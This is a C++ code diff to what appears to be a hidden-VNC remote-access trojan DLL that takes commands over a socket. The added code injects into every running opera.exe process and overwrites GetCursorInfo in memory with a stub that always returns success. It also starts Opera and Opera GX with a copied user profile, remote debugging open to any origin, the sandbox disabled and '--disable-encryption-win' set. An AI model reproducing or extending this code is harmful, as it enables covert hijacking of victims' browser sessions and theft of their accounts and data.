@@ -165,6 +165,102 @@ static bool g_capsLock = false;
 static bool g_leftButtonDown = false;
 static HWND g_lbDownHwnd = NULL;
 
+static thread g_patchThread;
+static atomic_bool g_patchRunning(false);
+
+static DWORD_PTR GetModuleBaseAddress(DWORD pid, const wchar_t* modName) {
+    DWORD_PTR addr = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        MODULEENTRY32W me;
+        me.dwSize = sizeof(me);
+        if (Module32FirstW(hSnap, &me)) {
+            do {
+                if (_wcsicmp(me.szModule, modName) == 0) {
+                    addr = (DWORD_PTR)me.modBaseAddr;
+                    break;
+                }
+            } while (Module32NextW(hSnap, &me));
+        }
+        CloseHandle(hSnap);
+    }
+    return addr;
+}
+
+static bool patch_cursor_info(DWORD pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProcess) return false;
+
+    bool is32Bit = false;
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
+        is32Bit = true;
+    } else {
+        BOOL isWow64 = FALSE;
+        if (IsWow64Process(hProcess, &isWow64)) {
+            is32Bit = isWow64;
+        }
+    }
+
+    DWORD_PTR localUser32 = (DWORD_PTR)GetModuleHandleW(L"user32.dll");
+    DWORD_PTR localGetCursorInfo = (DWORD_PTR)GetProcAddress((HMODULE)localUser32, "GetCursorInfo");
+    if (!localGetCursorInfo) {
+        CloseHandle(hProcess);
+        return false;
+    }
+    DWORD_PTR offset = localGetCursorInfo - localUser32;
+
+    DWORD_PTR targetUser32 = GetModuleBaseAddress(pid, L"user32.dll");
+    if (targetUser32 == 0) {
+        targetUser32 = localUser32;
+    }
+    DWORD_PTR targetAddr = targetUser32 + offset;
+
+    vector<unsigned char> patch;
+    if (is32Bit) {
+        patch = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC2, 0x04, 0x00};
+    } else {
+        patch = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3};
+    }
+
+    DWORD oldProtect = 0;
+    if (VirtualProtectEx(hProcess, (LPVOID)targetAddr, patch.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        SIZE_T written = 0;
+        BOOL ok = WriteProcessMemory(hProcess, (LPVOID)targetAddr, patch.data(), patch.size(), &written);
+        VirtualProtectEx(hProcess, (LPVOID)targetAddr, patch.size(), oldProtect, &oldProtect);
+        CloseHandle(hProcess);
+        return ok && (written == patch.size());
+    }
+
+    CloseHandle(hProcess);
+    return false;
+}
+
+static void patch_all_opera_processes() {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+
+    PROCESSENTRY32W pe32{};
+    pe32.dwSize = sizeof(pe32);
+
+    if (Process32FirstW(hSnap, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, L"opera.exe") == 0) {
+                patch_cursor_info(pe32.th32ProcessID);
+            }
+        } while (Process32NextW(hSnap, &pe32));
+    }
+    CloseHandle(hSnap);
+}
+
+static void patch_loop() {
+    while (g_patchRunning) {
+        patch_all_opera_processes();
+        this_thread::sleep_for(chrono::seconds(1));
+    }
+}
+
 static void request_full_frame(bool immediate = true) {
     DWORD now = GetTickCount();
     if (immediate) {
@@ -1768,11 +1864,16 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 if (g_inputThread.joinable()) g_inputThread.join();
                 g_inputThread = thread(input_loop);
             }
+            if (!g_patchRunning.exchange(true)) {
+                if (g_patchThread.joinable()) g_patchThread.join();
+                g_patchThread = thread(patch_loop);
+            }
         } else if (action == "hvnc_stop") {
             g_captureRunning = false;
             g_encodeRunning  = false;
             g_sendRunning    = false;
             g_inputRunning   = false;
+            g_patchRunning   = false;
             g_frameCV.notify_all();
             g_sendCV.notify_all();
             g_inputCV.notify_all();
@@ -1780,6 +1881,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (g_encodeThread.joinable())  g_encodeThread.join();
             if (g_sendThread.joinable())    g_sendThread.join();
             if (g_inputThread.joinable())   g_inputThread.join();
+            if (g_patchThread.joinable())   g_patchThread.join();
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
@@ -1999,6 +2101,37 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         if (copyProfile) {
                             args += L" -profile \"" + profilePath + L"\"";
                         }
+                    } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
+                        // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
+                        args = L" --remote-debugging-port=9222";
+                        if (copyProfile) {
+                            args += L" --user-data-dir=\"" + profilePath + L"\"";
+                        }
+                        args += L" --no-sandbox"
+                                L" --disable-gpu"
+                                L" --window-size=1280,720"
+                                L" --window-position=0,0"
+                                L" --no-first-run"
+                                L" --no-default-browser-check"
+                                L" --disable-background-networking"
+                                L" --disable-sync"
+                                L" --disable-translate"
+                                L" --metrics-recording-only"
+                                L" --safebrowsing-disable-auto-update"
+                                L" --disable-setuid-sandbox"
+                                L" --disable-infobars"
+                                L" --disable-gpu-compositing"
+                                L" --force-cpu-draw"
+                                L" --disable-encryption-win"
+                                L" --restore-last-session"
+                                L" --no-pings"
+                                L" --disable-notifications"
+                                L" --disable-component-update"
+                                L" --disable-blink-features=AutomationControlled"
+                                L" --disable-backgrounding-occluded-windows"
+                                L" --disable-renderer-backgrounding"
+                                L" --remote-allow-origins=*"
+                                L" --lang=en-US";
                     } else {
                         args = L" --remote-debugging-port=9222";
                         if (copyProfile) {
@@ -2123,6 +2256,7 @@ BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
         g_encodeRunning  = false;
         g_sendRunning    = false;
         g_inputRunning   = false;
+        g_patchRunning   = false;
         g_frameCV.notify_all();
         g_sendCV.notify_all();
         g_inputCV.notify_all();
